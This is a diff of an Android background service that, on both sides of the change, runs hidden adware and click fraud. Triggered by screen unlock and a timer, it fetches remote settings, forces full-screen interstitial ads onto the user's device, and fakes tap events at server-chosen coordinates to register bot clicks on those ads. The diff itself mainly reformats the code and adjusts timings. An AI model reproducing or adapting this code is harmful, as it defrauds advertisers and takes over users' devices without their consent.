@@ -53,17 +53,17 @@ public class MyService extends Service {
     private String idFullService;
     private int intervalService;
     private int delayService;
-    private InterstitialAd mInterstitialAd;
+    CheckAds checkAds;
+    InterstitialAd mInterstitialAd;
 
-    private CheckAds checkAds;
 
     @Override
     public void onCreate() {
-        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver_ringtone", 0);
+        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        idFullService = mPrefs.getString("idFullService", "ca-app-pub-3940256099942544/1033173712");
-        intervalService = mPrefs.getInt("intervalService", 5);
-        delayService = mPrefs.getInt("delayService", 12);
+        idFullService = mPrefs.getString("idFullService","ca-app-pub-3940256099942544/1033173712");
+        intervalService = mPrefs.getInt("intervalService",5);
+        delayService = mPrefs.getInt("delayService",12);;
 
         MyBroadcast myBroadcast = new MyBroadcast();
         IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
@@ -79,15 +79,18 @@ public class MyService extends Service {
 
 
     private void scheduleTask() {
+
+
         myTask = new ScheduledThreadPoolExecutor(1);
         myTask.scheduleAtFixedRate(new Runnable() {
             @Override
             public void run() {
-                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver_ringtone", 0);
-                int totalTime = mPrefs.getInt("totalTime", 0);
+                SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+                int totalTime = mPrefs.getInt("totalTime",0);
                 totalTime += intervalService;
-                mPrefs.edit().putInt("totalTime", totalTime).commit();
-                if (!isContinousShowAds || (totalTime < delayService * 60)) {
+                mPrefs.edit().putInt("totalTime",totalTime).commit();
+                if( !isContinousShowAds || (totalTime < delayService * 60))
+                {
                     return;
                 }
 
@@ -99,7 +102,6 @@ public class MyService extends Service {
                 client.newCall(okRequest).enqueue(new Callback() {
                     @Override
                     public void onFailure(Call call, IOException e) {
-
                     }
 
                     @Override
@@ -118,17 +120,16 @@ public class MyService extends Service {
                                             super.onAdClosed();
                                             if (!isClickAds)
                                                 checkAds(0);
-
                                             try {
                                                 if (Build.VERSION.SDK_INT < 21) {
                                                     ShowAds.getInstance().finishAffinity();
                                                 } else {
                                                     ShowAds.getInstance().finishAndRemoveTask();
                                                 }
-                                                android.os.Process.killProcess(android.os.Process.myPid());
                                             } catch (Exception e) {
                                                 e.printStackTrace();
                                             }
+
                                         }
 
                                         @Override
@@ -140,8 +141,7 @@ public class MyService extends Service {
                                         @Override
                                         public void onAdLeftApplication() {
                                             super.onAdLeftApplication();
-                                            if (!isClickAds)
-                                                isClickAds = true;
+                                            isClickAds = true;
                                             if (isBotClick)
                                                 checkAds(2);
                                             else
@@ -157,23 +157,23 @@ public class MyService extends Service {
                                                     @Override
                                                     public void run() {
                                                         try {
-                                                            Thread.sleep(checkAds.delayClick * 100);
+                                                            Thread.sleep( checkAds.delayClick * 100);
                                                             WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                                                             Display display = window.getDefaultDisplay();
                                                             Point point = new Point();
                                                             display.getSize(point);
-                                                            int width = checkAds.x * point.x / 100;
-                                                            int height = checkAds.y * point.y / 100;
+                                                            int width =  checkAds.x * point.x / 100;
+                                                            int height =  checkAds.y * point.y /100;
                                                             Instrumentation m_Instrumentation = new Instrumentation();
                                                             m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                     android.os.SystemClock.uptimeMillis(),
                                                                     android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_DOWN, width, height, 0));
+                                                                    MotionEvent.ACTION_DOWN, width,  height, 0));
                                                             Thread.sleep(new Random().nextInt(100));
                                                             m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                     android.os.SystemClock.uptimeMillis(),
                                                                     android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_UP, width, height, 0));
+                                                                    MotionEvent.ACTION_UP, width,  height, 0));
                                                             isBotClick = true;
                                                         } catch (Exception e) {
                                                             e.printStackTrace();
@@ -187,18 +187,25 @@ public class MyService extends Service {
                                         @Override
                                         public void onAdLoaded() {
                                             super.onAdLoaded();
+                                            try {
+                                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
+                                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                                startActivity(showAds);
+                                                mInterstitialAd.show();
+                                            }
+                                            catch (Exception e)
+                                            {
+                                            }
 
-                                            Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
-                                            showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                            startActivity(showAds);
-                                            mInterstitialAd.show();
                                         }
                                     });
 
                                     mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
                                 }
                             });
-                        } else {
+                        }
+                        else
+                        {
                             isContinousShowAds = false;
                         }
 
@@ -206,9 +213,8 @@ public class MyService extends Service {
                 });
 
             }
-        }, 10, intervalService, TimeUnit.MINUTES);
-
-
+        }, 30, intervalService, TimeUnit.MINUTES);
+//        }, 20, 10, TimeUnit.SECONDS);
     }
 
     private void checkAds(int isClick) {
@@ -226,7 +232,6 @@ public class MyService extends Service {
             @Override
             public void onFailure(Call call, IOException e) {
             }
-
             @Override
             public void onResponse(Call call, Response response) throws IOException {
             }
